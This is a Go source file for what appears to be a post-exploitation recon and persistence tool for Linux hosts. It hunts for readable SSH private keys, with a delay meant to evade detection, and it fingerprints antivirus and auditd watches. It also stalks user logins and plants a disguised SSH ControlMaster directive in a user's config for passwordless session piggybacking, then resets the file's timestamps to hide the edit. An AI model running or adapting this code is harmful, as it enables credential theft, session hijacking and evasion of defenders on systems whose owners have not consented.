package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	osuser "os/user"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	utmp "github.com/EricLagergren/go-gnulib/utmp"
	netstat "github.com/drael/GOnetstat"
	ps "github.com/unixist/go-ps"
	netlink "github.com/vishvananda/netlink"
)

// CLI flags
var (
	// Recon
	flag_gatt       = flag.Bool("gatt", false, "Get all the things. This flag only performs one-time read actions, e.g. --av, and --who.")
	flag_pkeys      = flag.Bool("pkeys", false, "Detect private keys")
	flag_pkey_dirs  = flag.String("pkey-dirs", "/root,/home", "Comma-separated directories to search for private keys. Default is '/root,/home'. Requires --pkeys.")
	flag_pkey_sleep = flag.Int("pkey-sleep", 0, "Length of time in milliseconds to sleep between examining files. Requires --flag_pkey_dirs.")
	flag_av         = flag.Bool("av", false, "Check for signs of A/V services running or present.")
	flag_container  = flag.Bool("container", false, "Detect if this system is running in a container.")
	flag_net        = flag.Bool("net", false, "Grab IPv4 and IPv6 networking connections.")
	flag_watches    = flag.Bool("watches", false, "Grab which files/directories are being watched for modification/access/execution.")
	flag_arp        = flag.Bool("arp", false, "Grab ARP table for all devices.")
	flag_who        = flag.Bool("who", false, "List who's logged in and from where.")
	// Recon over time
	flag_poll_net   = flag.Bool("pollnet", false, "Long poll for networking connections and a) output a summary; or b) output regular connection status. [NOT IMPLEMENTED]")
	flag_poll_users = flag.Bool("pollusers", false, "Long poll for users that log into the system. [NOT IMPLEMENTED]")

	// Non-recon
	flag_stalk     = flag.String("stalk", "", "Wait until a user logs in and then do something. Use \"*\" to match any user.")
	flag_ssh_cm    = flag.String("ssh-cm", "", "Set user's $HOME/.ssh/config to include a ControlMaster directive for passwordless piggybacking.")
	flag_rm_ssh_cm = flag.String("rm-ssh-cm", "", "Remove user's ControlMaster directive.")
)

var (
	// Antivirus systems we detect
	AVSystems = []AVDiscoverer{
		OSSECAV{name: "OSSEC"},
		SophosAV{name: "Sophos"},
	}
	// The typical location where auditd looks for its ruleset
	AuditdRules = "/etc/audit/audit.rules"
	// The typical location utmp stores login information
	UtmpPath = "/var/run/utmp"
)

type stalkAction func(string) error

type sshPrivateKey struct {
	path      string
	encrypted bool
}

// watch holds the information for which the system is attempting to detect access.
type watch struct {
	// Path being watched.
	path string
	// Action the watch is looking for, i.e. read/write/execute. For example "wa" would detect file writes or appendages.
	action string
}

type who struct {
	// Username, line (tty/pty), originating host that user is logging in from
	user, line, host string
	// User's login process ID. Typically sshd process
	pid int32
	// Login time
	time int32
}

type process struct {
	pid  int
	name string
}
type loadedKernelModule struct {
	address string
	size    int
	name    string
}

type OSSECAV struct {
	AVDiscoverer
	name string
}

type SophosAV struct {
	AVDiscoverer
	name string
}

// Each AV system implements this interface to expose artifacts of the detected system.
type AVDiscoverer interface {
	// Filesystem paths of binaries
	Paths() []string
	// Running processes
	Procs() []process
	// Loaded kernel modules
	KernelModules() []loadedKernelModule
	// Name of the AV system
	Name() string
}

func (o OSSECAV) Paths() []string {
	return existingPaths([]string{
		"/var/ossec",
	})
}

func (o OSSECAV) Procs() []process {
	return runningProcs([]string{
		"ossec-agentd",
		"ossec-syscheckd",
	})
}

// KernelModules returns an empty list as OSSEC doesn't use kernel modules.
func (o OSSECAV) KernelModules() []loadedKernelModule {
	return []loadedKernelModule{}
}

func (o OSSECAV) Name() string {
	return o.name
}

func (s SophosAV) Paths() []string {
	return existingPaths([]string{
		"/etc/init.d/sav-protect",
		"/etc/init.d/sav-rms",
		"/lib/systemd/system/sav-protect.service",
		"/lib/systemd/system/sav-rms.service",
		"/opt/sophos-av",
	})
}

func (s SophosAV) Procs() []process {
	return runningProcs([]string{
		"savd",
		"savscand",
	})
}

func (o SophosAV) KernelModules() []loadedKernelModule {
	return []loadedKernelModule{}
}

func (o SophosAV) Name() string {
	return o.name
}

// existingPaths returns a subset of paths that exist on the filesystem.
func existingPaths(paths []string) []string {
	found := []string{}
	for _, path := range paths {
		if _, err := os.Stat(path); err == nil {
			found = append(found, path)
		}
	}
	return found
}

// runningProcs returns a subset of processes that are currently running.
func runningProcs(procs []string) []process {
	allProcs, _ := ps.Processes()
	found := []process{}
	for _, aproc := range allProcs {
		procName := aproc.Executable()
		for _, need := range procs {
			if need == procName {
				found = append(found, process{
					pid:  aproc.Pid(),
					name: procName,
				})
			}
		}
	}
	return found
}

// getPrivateKey extracts a sshPrivateKey object from a string if a key exists.
func getPrivateKey(path string) sshPrivateKey {
	p := sshPrivateKey{}
	f, err := os.Open(path)
	// If we don't have permission to open the file, skip it.
	if err != nil {
		return p
	}
	defer f.Close()
	head := make([]byte, 32)
	_, err = f.Read(head)
	if err != nil {
		return p
	}
	if matched, _ := regexp.Match("-----BEGIN .* PRIVATE KEY-----\n", head); !matched {
		return p
	}
	// This is a private key. Let's find out if it's encrypted
	br := bufio.NewReader(f)
	line, err := br.ReadString('\n')
	if err != nil {
		return p
	}
	p = sshPrivateKey{
		path:      path,
		encrypted: strings.HasSuffix(line, "ENCRYPTED\n"),
	}
	return p
}

// getSSHKeys looks for readable ssh private keys. Optionally sleep for `sleep`
// milliseconds to evade detection.
func getSSHKeys(dir string, sleep int) []sshPrivateKey {
	pkeys := []sshPrivateKey{}
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if sleep != 0 {
			time.Sleep(time.Duration(sleep) * time.Millisecond)
		}
		if info == nil || !info.Mode().IsRegular() {
			return nil
		}
		pkey := getPrivateKey(path)
		if pkey != (sshPrivateKey{}) {
			pkeys = append(pkeys, pkey)
		}
		return nil
	})
	return pkeys
}

// isContainer looks at init's cgroup and total process count to guess at
// whether we're in a container
func isContainer() bool {
	procs, err := ps.Processes()
	if err != nil {
		return false
	}
	if len(procs) <= 10 {
		return true
	}
	t, err := ioutil.ReadFile("/proc/1/cgroup")
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(t), "\n") {
		if line == "" {
			break
		}
		if strings.Index(line, "docker") != -1 {
			return true
		} else if !strings.HasSuffix(line, ":/") {
			return true
		}
	}
	return false
}

// getArp fetches the current arp table, the map between known MACs and their IPs
func getArp() []netlink.Neigh {
	neighs, err := netlink.NeighList(0, 0)
	if err != nil {
		return []netlink.Neigh{}
	} else {
		return neighs
	}
}

// getWho fetches information about currently logged-in users.
func getWho() []who {
	found := []who{}
	utmps, err := utmp.ReadUtmp(UtmpPath, utmp.LoginProcess)
	if err != nil {
		return found
	}
	for _, u := range utmps {
		found = append(found, who{
			user: string(bytes.Trim(u.User[:], "\x00")),
			host: string(bytes.Trim(u.Host[:], "\x00")),
			line: string(bytes.Trim(u.Line[:], "\x00")),
			pid:  u.Pid,
			time: u.Tv.Sec,
		})
	}
	return found
}

// getAV returns a list of AV systems that we support detecting
func getAV() []AVDiscoverer {
	allAV := []AVDiscoverer{}
	for _, av := range AVSystems {
		allAV = append(allAV, av)
	}
	return allAV
}

// getWatches fetches a list of watches that auditd currently has on filesystem paths.
func getWatches() ([]watch, error) {
	re := regexp.MustCompile("-w ([^[:space:]]+).* -p ([[:alpha:]]+)")
	t, err := ioutil.ReadFile(AuditdRules)
	found := []watch{}
	if err != nil {
		return nil, fmt.Errorf("Unable to open %v", AuditdRules)
	}
	for _, line := range strings.Split(string(t), "\n") {
		matches := re.FindStringSubmatch(line)
		if len(matches) == 3 {
			found = append(found, watch{
				path:   matches[1],
				action: matches[2],
			})
		}
	}
	return found, nil
}

func getSSHConfigFilename(user string) (string, error) {
	u, err := osuser.Lookup(user)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("%s/.ssh/config", u.HomeDir), nil
}

func setSSHControlMaster(user string) error {
	var origTime = time.Time{}
	filename, err := getSSHConfigFilename(user)
	if s, err := os.Stat(filename); err == nil {
		origTime = s.ModTime()
	}
	if err != nil {
		return err
	}
	// Either create the config file or append to it
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return err
	}
	defer f.Close()

	directive := `Host *  # Default config. Do not edit below this line.
        ControlPath ~/.ssh/.config
        ControlMaster auto
        ControlPersist 10m`
	f.WriteString(directive + "\n")

	// Replace the original access and modification times.
	if err := os.Chtimes(filename, origTime, origTime); err != nil {
		fmt.Println("Couldn't reset atime/mtime on ssh config file.")
	}
	return nil
}

func unsetSSHControlMaster(user string) error {
	var origTime = time.Time{}
	filename, err := getSSHConfigFilename(user)
	if err != nil {
		return err
	}
	if s, err := os.Stat(filename); err == nil {
		origTime = s.ModTime()
	}

	// Snarf in the whole file and search lines for our distinct "Host *" line.
	body, err := ioutil.ReadFile(filename)
	if err != nil {
		// Somehow the config was removed. Panic.
		return err
	}
	// Janky means of munging the config file back to its original state
	newFile := ""
	toSkip := 4
	haveSkipped := 0
	for _, line := range strings.Split(string(body), "\n") {
		if line == "Host *  # Default config. Do not edit below this line." {
			haveSkipped += 1
		}
		// We'll skip a maximum of three lines
		if haveSkipped > 0 && haveSkipped <= toSkip {
			haveSkipped += 1
		} else {
			newFile += line + "\n"
		}
	}
	// We didn't find our Control Master. In this case, we either hadn't yet set Control Master
	// or it has since been removed. Either way, don't modify the config file. Just bail.
	if haveSkipped == 0 {
		return nil
	}
	// This hack removes potentially multiple trailing newlines and replaces it with just a single newline.
	// This doesn't leave things *exactly* as they were prior to injecting the Control Master.
	// (In cases where removing the ControlMaster directive would result in multiple legit newlines. This
	// is improbable.)
	newFile = strings.TrimRight(newFile, "\n")
	newFile += "\n"

	// Create temp file, write the new contents, then replace user's config file with this new one.
	tmp, err := ioutil.TempFile(filepath.Dir(filename), "tmp")
	defer tmp.Close()
	if err != nil {
		fmt.Println("Can't unset SSH Control Master")
		return err
	}

	// Create the new config without the Control Master directive.
	if _, err := tmp.WriteString(newFile); err != nil {
		fmt.Println("Unable to create new config in temp file")
		return err
	}

	// Move the new config into place.
	if err := os.Rename(tmp.Name(), filename); err != nil {
		fmt.Println("Error placing new config", err)
		return err
	}

	// Replace the original access and modification times.
	if err := os.Chtimes(filename, origTime, origTime); err != nil {
		// Even if we can't update the times, don't return an error since the primary
		// objective of this function is successful.
		fmt.Println("Couldn't reset atime/mtime on ssh config file")
	}
	return nil
}

// stalkUser perform an action when a specific user logs in at any point in the future.
// If user == "*", any user will trigger the action.
func stalkUser(user string, sa stalkAction) error {
	start := time.Now()
	ticker := time.NewTicker(1 * time.Second)
	//go func() {
	for {
		select {
		case <-ticker.C:
			for _, w := range getWho() {
				if (user == "*" || user == w.user) && start.Before(time.Unix(int64(w.time), 0)) {
					sa(w.user)
					start = time.Now()
				}
			}
			//ticker.Stop()
		}
	}
	//}()
	return nil
}

func main() {
	flag.Parse()
	if *flag_gatt || *flag_container {
		fmt.Printf("isContainer: %v\n", isContainer())
	}
	if *flag_gatt || *flag_pkeys {
		fmt.Printf("ssh keys:")
		for _, dir := range strings.Split(*flag_pkey_dirs, ",") {
			for _, pkey := range getSSHKeys(dir, *flag_pkey_sleep) {
				fmt.Printf("\n\tfile=%v encrypted=%v", pkey.path, pkey.encrypted)
			}
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_av {
		fmt.Printf("AV:")
		for _, av := range AVSystems {
			name, paths, procs, mods := av.Name(), av.Paths(), av.Procs(), av.KernelModules()
			if len(paths) > 0 || len(procs) > 0 {
				fmt.Printf("\n\tname=%s files=%v procs=%v, modules=%v", name, paths, procs, mods)
			}
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_net {
		fmt.Printf("ipv4 connections:")
		for _, conn := range netstat.Tcp() {
			if conn.State == "ESTABLISHED" {
				fmt.Printf("\n\t tcp4: %s:%d <> %s:%d", conn.Ip, conn.Port, conn.ForeignIp, conn.ForeignPort)
			}
		}
		fmt.Println("")
		for _, conn := range netstat.Udp() {
			if conn.State == "ESTABLISHED" {
				fmt.Printf("\n\t udp4: %s:%d <> %s:%d", conn.Ip, conn.Port, conn.ForeignIp, conn.ForeignPort)
			}
		}

		fmt.Printf("\nipv6 connections:")
		for _, conn := range netstat.Tcp6() {
			if conn.State == "ESTABLISHED" {
				fmt.Printf("\n\t tcp6: %s:%d <> %s:%d", conn.Ip, conn.Port, conn.ForeignIp, conn.ForeignPort)
			}
		}
		fmt.Println("")
		for _, conn := range netstat.Udp6() {
			if conn.State == "ESTABLISHED" {
				fmt.Printf("\n\t udp6: %s:%d <> %s:%d", conn.Ip, conn.Port, conn.ForeignIp, conn.ForeignPort)
			}
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_watches {
		fmt.Printf("Watches:")
		watches, err := getWatches()
		if err != nil {
			fmt.Println("Error checking watches: ", err)
		} else {
			for _, w := range watches {
				fmt.Printf("\n\tpath=%v action=%v", w.path, w.action)
			}
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_arp {
		fmt.Printf("ARP table:")
		for _, arp := range getArp() {
			fmt.Printf("\n\tmac=%s ip=%s", arp.HardwareAddr, arp.IP)
		}
		fmt.Println("")
	}
	if *flag_gatt || *flag_who {
		fmt.Printf("Logged in:")
		for _, w := range getWho() {
			t := time.Unix(int64(w.time), 0)
			fmt.Printf("\n\tuser=%s host=%s line=%s pid=%d login_time=%d (%s)", w.user, w.host, w.line, w.pid, w.time, t)
		}
		fmt.Println("")
	}
	if *flag_stalk != "" {
		stalkUser(*flag_stalk, func(user string) error { fmt.Printf("User logged in! %s", user); return nil })
	}
	if *flag_ssh_cm != "" {
		setSSHControlMaster(*flag_ssh_cm)
	}
	if *flag_rm_ssh_cm != "" {
		unsetSSHControlMaster(*flag_rm_ssh_cm)
	}
}
